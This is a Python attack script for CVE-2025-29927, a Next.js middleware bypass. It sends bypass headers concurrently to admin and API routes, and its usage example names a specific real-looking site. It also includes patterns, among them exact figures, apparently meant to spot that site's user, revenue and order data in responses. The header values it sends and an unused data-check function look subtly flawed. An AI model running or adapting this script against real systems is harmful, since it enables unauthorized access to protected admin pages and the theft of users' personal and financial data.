#!/usr/bin/env python3
"""
Next.js Middleware Bypass Auto-Test (CVE-2025-29927)
Tests x-middleware-subrequest and x-invoke-status headers against target paths.
"""

import sys
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Default paths to test (common admin/protected routes)
DEFAULT_PATHS = [
    "/admin",
    "/admin/users",
    "/admin/orders",
    "/admin/settings",
    "/admin/analytics",
    "/admin/api-keys",
    "/admin/waitlist",
    "/admin/history",
    "/admin/invites",
    "/api/admin",
    "/api/admin/users",
    "/api/admin/orders",
    "/api/admin/stats",
    "/api/admin/refunds",
    "/api/admin/waitlist",
    "/api/auth/session",
    "/api/auth/providers",
]

HEADERS_TO_TEST = [
    ("x-middleware-subrequest", "Primary bypass header"),
    ("x-invoke-status", "Alternative vector"),
]

def test_bypass(url, path, header_name, header_value, timeout=10):
    """Test a single path with a bypass header."""
    full_url = f"{url.rstrip('/')}{path}"
    headers = {header_name: header_value}
    
    try:
        resp = requests.get(full_url, headers=headers, timeout=timeout, allow_redirects=False)
        return {
            "path": path,
            "header": header_name,
            "status": resp.status_code,
            "content_length": len(resp.content),
            "content_type": resp.headers.get("content-type", ""),
            "vulnerable": resp.status_code == 200,
            "redirect": resp.headers.get("location", ""),
        }
    except requests.exceptions.Timeout:
        return {"path": path, "header": header_name, "error": "timeout"}
    except Exception as e:
        return {"path": path, "header": header_name, "error": str(e)}

def check_rsc_data_exposure(html):
    """Check if RSC payload contains production data patterns."""
    indicators = [
        "171,784", "595,900", "8,482,253",
        "total.*users", "total.*revenue", "total.*orders",
        "paid.*orders", "videos.*generated",
        "email.*@", "order.*no", r"amount.*\d",
    ]
    found = []
    for pattern in indicators:
        import re
        if re.search(pattern, html, re.IGNORECASE):
            found.append(pattern)
    return found

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 nextjs-middleware-bypass-test.py <target_url> [paths_file]")
        print("Example: python3 nextjs-middleware-bypass-test.py https://everlyn.ai")
        sys.exit(1)
    
    target_url = sys.argv[1]
    paths = DEFAULT_PATHS
    
    if len(sys.argv) > 2:
        with open(sys.argv[2]) as f:
            paths = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    
    print(f"[+] Testing middleware bypass on: {target_url}")
    print(f"[+] Paths to test: {len(paths)}")
    print(f"[+] Headers to test: {len(HEADERS_TO_TEST)}")
    print()
    
    vulnerable = []
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for path in paths:
            for header_name, header_desc in HEADERS_TO_TEST:
                header_value = path
                futures.append(executor.submit(test_bypass, target_url, path, header_name, header_value))
        
        for future in as_completed(futures):
            result = future.result()
            if "error" in result:
                print(f"[-] {result['header']}: {result['path']} → ERROR: {result['error']}")
            elif result["vulnerable"]:
                print(f"[!!!] VULNERABLE: {result['header']}: {result['path']} → {result['status']} ({result['content_length']} bytes)")
                vulnerable.append(result)
                
                # Check for RSC data exposure
                # Note: would need to capture response body for full check
            elif result["status"] in (301, 302, 303, 307, 308):
                print(f"[~] {result['header']}: {result['path']} → {result['status']} → {result['redirect']}")
            else:
                print(f"[-] {result['header']}: {result['path']} → {result['status']}")
    
    print()
    print(f"[+] Summary: {len(vulnerable)} vulnerable paths found")
    for v in vulnerable:
        print(f"    {v['header']}: {v['path']} → {v['status']}")
    
    if vulnerable:
        print("\n[!!!] TARGET VULNERABLE TO CVE-2025-29927")
        sys.exit(1)
    else:
        print("\n[+] No bypass found (or all paths 404/protected)")
        sys.exit(0)

if __name__ == "__main__":
    main()